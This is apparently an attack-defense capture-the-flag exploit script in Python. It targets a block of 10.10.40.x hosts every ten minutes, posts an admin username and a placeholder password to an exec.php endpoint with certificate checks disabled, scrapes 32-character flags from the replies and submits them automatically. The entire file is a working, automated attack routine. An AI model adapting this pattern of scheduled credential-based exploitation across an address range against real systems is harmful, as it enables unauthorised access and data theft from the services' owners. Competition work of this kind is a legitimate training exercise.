from attack import *
from attack_targets import ip_range, PostTarget
from EsseSubmitter import EsseSubmitter
import requests
import re
from xml.etree import ElementTree

ips = ip_range(10, 10, 40, 101, 124)
ips = [ip for ip in ips if ip != "10.10.40.108"]


targets = [Target(ip, 9000) for ip in ips]


@local
@every(minutes=10, seconds=0)
@attack(targets)
@submit(EsseSubmitter)
def exploit(target: Target):
    flags = []
    url = f"https://{target.get_host_str()}/exec.php"
    args = {"username":"admin","password": "NETTERMUSIC_ADMIN_PW_PLACEHOLDER" , "specifier": ""}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    regex = "TRACKS (separated by the | character) =/[a-zA-Z0-9]{32}/ "
    response = requests.post(url, data=args, headers=headers, verify=False)
    matches = []

    for l in response.text.splitlines():
        if "TRACKS" in l:
            matches = re.findall("TRACKS \(separated by the \| character\) = [a-zA-Z0-9_]{32}", response.text)
            for match in matches:
                flag = match.split(" = ")[1]
                flags.append(flag)


    return flags
